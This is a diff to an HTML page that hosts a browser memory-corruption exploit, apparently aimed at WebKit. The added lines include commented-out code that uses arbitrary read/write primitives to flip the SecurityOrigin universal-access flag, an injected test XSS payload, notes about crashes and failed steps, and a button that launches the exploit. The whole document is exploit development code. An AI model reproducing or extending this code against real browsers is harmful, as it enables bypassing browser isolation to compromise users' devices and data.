@@ -704,7 +704,38 @@
             //anchor is webcore ?
             var anchor = memory.read_i64(v_tlb, 0);
             log("\t[+] anchor:" + anchor);
+            //TODO:What we can do with the anchor? Now we have R/W (mostly still in sandbox)
             //log('\t[+] Data from anchor is:\n' + hexdump(memory.read(ad_div, 0x100), 16, 0));
+            /*
+            //FIXME:Here is a test code with arb R/W, then try to get shell. But it do not work
+            var jsxhr = new XMLHttpRequest();
+            var jsxhrAddr = addrof(jsxhr);
+            alert1("[+] jsxhrAddr:" + jsxhrAddr.toString(16));
+
+            var xhrAddr = memory.read_i64(jsxhrAddr, 0x18);
+            var scriptExecContextAddr = memory.read_i64(xhrAddr, 0x68);
+            alert1("[+] scriptExecContextAddr:" + scriptExecContextAddr.toString(16));
+
+            //Some time we just get the memory at the addr with various 0xff(Maybe for not init?
+            var securityOriginPolicyAddr = memory.read_i64(scriptExecContextAddr, 8);
+            var securityOriginAddr = memory.read_i64(securityOriginPolicyAddr, 8);
+            alert1("[+] securityOriginAddr:" + securityOriginAddr.toString(16));
+
+            // m_universalAccess flag is at +0x31, set it to 1
+            //The flags here is 0x0004000400040004 from the log :(
+            var flags = memory.read_i64(securityOriginAddr, 0x30);
+            alert1("[+] m_universalAccess flag:" + flags);//+ describe(flags) + " content:"
+            //As we cannot do arb W, here we cannot change it
+            memory.write_i64(securityOriginAddr, 0x30, flags + 0x0100);
+            alert1("[+] m_universalAccess flag now:" + memory.read_i64(securityOriginAddr + 0x30).toString(16));
+
+            //test XSS
+            //The code here can be added to element, but do not work as we think
+            var PAYLOAD = '\<script\> alert(123)\<\/script\>';
+            var doc= document.createElement("aaaa");
+            doc.innerHTML=PAYLOAD;
+            document.body.appendChild(doc);
+             */
 
             alert('[+] a test breakpoint after stage 1')
             var hdr = Sub(anchor, anchor.lo() & 0xfff);
@@ -888,6 +919,7 @@
                 //alert1("lib : " + imgsarr[i].name + "@" + imgsarr[i].addr);
                 alert1(" lib # " + (i + 1) + " : " + imgsarr[i].name + " @ " + imgsarr[i].addr);
                 //imgsarr points to dylibs aka "images"
+                //FIXME:Now there is some problem that the page will crash after the below sentences
                 /*var machheader = dec2hex(memory.u32(imgsarr[i].addr));
                 alert1("[+] debug:machheader-" + machheader)*/
                 //alert('[+] a test breakpoint for stage 2')
@@ -1167,4 +1199,7 @@
     exploit();
 
 </script>
+<div>
+    <button type="button" onclick="exploit()">Start exploit</button>
+</div>
 </html>
